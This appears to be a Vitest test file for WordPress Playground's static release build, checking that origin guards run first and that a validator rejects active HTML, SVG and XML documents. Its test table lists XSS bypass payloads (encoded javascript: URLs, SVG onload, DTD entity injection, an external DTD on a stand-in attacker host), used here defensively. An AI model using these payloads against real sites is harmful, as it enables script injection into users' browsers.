import {
	mkdtemp,
	mkdir,
	readFile,
	realpath,
	rm,
	writeFile,
} from 'node:fs/promises';
import { tmpdir } from 'node:os';
import { gzipSync } from 'node:zlib';
import { build } from 'vite';
import { JSDOM, VirtualConsole } from 'jsdom';
import { joinPaths } from '../php-wasm/util/src/lib/paths';
import { staticReleaseOriginCheckPlugin } from './vite-static-release';
import {
	protectStaticReleasePages,
	validateWordPressStaticDocuments,
} from './static-release-documents.mjs';

// Contract: published documents must not start app code on the WordPress origin.
// Vite's separate public-file copy path can otherwise silently omit the guard.
describe('static release documents', () => {
	let directory: string;
	beforeEach(async () => {
		directory = await realpath(
			await mkdtemp(joinPaths(tmpdir(), 'playground-documents-'))
		);
	});
	afterEach(async () => {
		vi.unstubAllEnvs();
		await rm(directory, { recursive: true, force: true });
	});

	it('guards built entries and copied public pages before their scripts execute', async () => {
		vi.stubEnv('PLAYGROUND_RELEASE_ID', 'test');
		vi.stubEnv('VITE_PLAYGROUND_APP_ORIGIN', 'https://app.example');
		vi.stubEnv('VITE_WORDPRESS_SITE_URL', 'https://wordpress.example');
		const html =
			'<!doctype html><html><head><script>window.entryExecuted=true</script></head></html>';
		await mkdir(joinPaths(directory, 'public'));
		for (const file of [
			'index.html',
			'wordpress-bridge.html',
			'public/copied.html',
		]) {
			await writeFile(joinPaths(directory, file), html);
		}
		await build({
			configFile: false,
			root: directory,
			logLevel: 'silent',
			plugins: [staticReleaseOriginCheckPlugin()],
			build: {
				rollupOptions: {
					input: {
						index: joinPaths(directory, 'index.html'),
						bridge: joinPaths(directory, 'wordpress-bridge.html'),
					},
				},
			},
		});
		for (const file of [
			'index.html',
			'wordpress-bridge.html',
			'copied.html',
		]) {
			const output = await readFile(
				joinPaths(directory, 'dist', file),
				'utf8'
			);
			for (const origin of [
				'https://app.example',
				'https://wordpress.example',
			]) {
				const dom = new JSDOM(output, {
					url: origin + '/releases/test/' + file,
					runScripts: 'outside-only',
					virtualConsole: new VirtualConsole(),
				});
				const expected =
					file === 'wordpress-bridge.html'
						? 'https://wordpress.example'
						: 'https://app.example';
				const guard = dom.window.document.head.firstElementChild!;
				expect(guard.tagName).toBe('SCRIPT');
				const execute = () => dom.window.eval(guard.textContent!);
				if (origin === expected) expect(execute).not.toThrow();
				else expect(execute).toThrow('Playground page loaded on');
				dom.window.close();
			}
		}
	});

	// Contract: reject active documents without changing static WordPress bytes.
	// HTML entity decoding, SVG namespaces, and XML processing instructions are
	// independent parser paths that a script-text regex does not cover.
	it.each([
		['page.HTML', '<ScRiPt>alert(1)</ScRiPt>'],
		[
			'image.svg',
			'<svg xmlns="http://www.w3.org/2000/svg"><metadata onload="alert(1)"/></svg>',
		],
		[
			'metadata.xml',
			'<feed><script xmlns="http://www.w3.org/1999/xhtml">alert(1)</script></feed>',
		],
		['page.htm', '<a href="java&#x73;cript:alert(1)">link</a>'],
		[
			'image.svg',
			'<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)"/>',
		],
		[
			'image.svg',
			'<svg xmlns="http://www.w3.org/2000/svg"><foreignObject><iframe xmlns="http://www.w3.org/1999/xhtml" srcdoc="&lt;script>alert(1)&lt;/script>"/></foreignObject></svg>',
		],
		[
			'page.xhtml',
			'<html xmlns="http://www.w3.org/1999/xhtml"><body ONLOAD="alert(1)"/></html>',
		],
		['feed.xml', '<?xml-stylesheet href="evil.xsl"?><feed/>'],
		[
			'image.svg',
			'<!DOCTYPE svg [<!ENTITY example "<script>alert(1)</script>">]><svg xmlns="http://www.w3.org/2000/svg">&example;</svg>',
		],
		[
			'image.svg',
			'<!DOCTYPE svg SYSTEM "https://attacker.test/active.dtd"><svg xmlns="http://www.w3.org/2000/svg"/>',
		],
		[
			'image.svg',
			'<!DOCTYPE svg [<!ATTLIST svg onload CDATA "alert(1)">]><svg xmlns="http://www.w3.org/2000/svg"/>',
		],
		[
			'image.svg',
			'<parsererror xmlns="http://www.mozilla.org/newlayout/xml/parsererror.xml"><script xmlns="http://www.w3.org/1999/xhtml">alert(1)</script></parsererror>',
		],
		[
			'image.svg',
			'<svg xmlns="http://www.w3.org/2000/svg"><set attributeName="onload" to="alert(1)"/></svg>',
		],
	])('rejects active content in %s', async (name, source) => {
		await mkdir(joinPaths(directory, 'wp-6.9'));
		await writeFile(joinPaths(directory, 'wp-6.9', name), source);
		await expect(
			validateWordPressStaticDocuments(directory)
		).rejects.toThrow('Active WordPress static document');
		expect(
			await readFile(joinPaths(directory, 'wp-6.9', name), 'utf8')
		).toBe(source);
	});

	it('accepts inert block templates and legacy SVG fonts without rewriting them', async () => {
		await mkdir(joinPaths(directory, 'wp-6.9'));
		const source =
			'<!-- wp:paragraph --><p>javascript: is plain text here</p><!-- /wp:paragraph -->';
		await writeFile(joinPaths(directory, 'wp-6.9/index.html'), source);
		await writeFile(
			joinPaths(directory, 'wp-6.9/font.svg'),
			'<svg xmlns="http://www.w3.org/2000/svg"><defs><font horiz-adv-x="100"><font-face font-family="example"/><missing-glyph/></font></defs></svg>'
		);
		await validateWordPressStaticDocuments(directory);
		expect(
			await readFile(joinPaths(directory, 'wp-6.9/index.html'), 'utf8')
		).toBe(source);
	});

	it('checks compressed SVG documents as well as plain SVG', async () => {
		await mkdir(joinPaths(directory, 'wp-6.9'));
		await writeFile(
			joinPaths(directory, 'wp-6.9/image.SVGZ'),
			gzipSync(
				'<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)"/>'
			)
		);
		await expect(
			validateWordPressStaticDocuments(directory)
		).rejects.toThrow('Active WordPress static document');
	});

	it('sniffs HTML encodings and rejects unsupported XML encodings', async () => {
		await mkdir(joinPaths(directory, 'wp-6.9'));
		await writeFile(
			joinPaths(directory, 'wp-6.9/page.html'),
			Buffer.from('\ufeff<script>alert(1)</script>', 'utf16le')
		);
		await expect(
			validateWordPressStaticDocuments(directory)
		).rejects.toThrow('Active WordPress static document');
		await rm(joinPaths(directory, 'wp-6.9/page.html'));
		await writeFile(
			joinPaths(directory, 'wp-6.9/image.svg'),
			Buffer.from(
				'\ufeff<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)"/>',
				'utf16le'
			)
		);
		await expect(
			validateWordPressStaticDocuments(directory)
		).rejects.toThrow('Unsupported encoding');
	});
});

// A comment must not capture the guard that must precede executable app scripts.
it('inserts guards into the parsed head rather than a comment', async () => {
	const directory = await mkdtemp(joinPaths(tmpdir(), 'playground-head-'));
	try {
		await writeFile(
			joinPaths(directory, 'index.html'),
			'<!-- Example <head> --><html><head><script>window.executed=true</script></head></html>'
		);
		await protectStaticReleasePages(
			directory,
			'https://app.example',
			'https://wp.example'
		);
		const dom = new JSDOM(
			await readFile(joinPaths(directory, 'index.html'), 'utf8'),
			{
				url: 'https://wp.example',
				runScripts: 'outside-only',
				virtualConsole: new VirtualConsole(),
			}
		);
		const guard = dom.window.document.head.firstElementChild!;
		expect(guard.textContent).toContain('location.origin');
		expect(() => dom.window.eval(guard.textContent!)).toThrow(
			'Playground page loaded on'
		);
		dom.window.close();
	} finally {
		await rm(directory, { recursive: true, force: true });
	}
});

// XML parsers may execute a valid prefix before discovering a malformed suffix.
it('rejects unreviewed malformed XML even after an executable prefix', async () => {
	const directory = await mkdtemp(joinPaths(tmpdir(), 'playground-xml-'));
	try {
		await mkdir(joinPaths(directory, 'wp-test'));
		await writeFile(
			joinPaths(directory, 'wp-test/image.svg'),
			'<svg xmlns="http://www.w3.org/2000/svg"><script>alert(1)</script><unclosed>'
		);
		await expect(
			validateWordPressStaticDocuments(directory)
		).rejects.toThrow('Malformed WordPress');
	} finally {
		await rm(directory, { recursive: true, force: true });
	}
});

it('accepts passive XML and editor metadata without hiding executable descendants', async () => {
	const directory = await mkdtemp(
		joinPaths(tmpdir(), 'playground-metadata-')
	);
	try {
		await mkdir(joinPaths(directory, 'wp-test'));
		await writeFile(
			joinPaths(directory, 'wp-test/feed.xml'),
			'<feed xmlns="urn:example"><entry>text</entry></feed>'
		);
		await writeFile(
			joinPaths(directory, 'wp-test/image.svg'),
			'<svg xmlns="http://www.w3.org/2000/svg" xmlns:inkscape="http://www.inkscape.org/namespaces/inkscape" inkscape:version="1.0"><metadata><inkscape:document>text</inkscape:document></metadata><path d="M0 0"/></svg>'
		);
		await validateWordPressStaticDocuments(directory);
	} finally {
		await rm(directory, { recursive: true, force: true });
	}
});
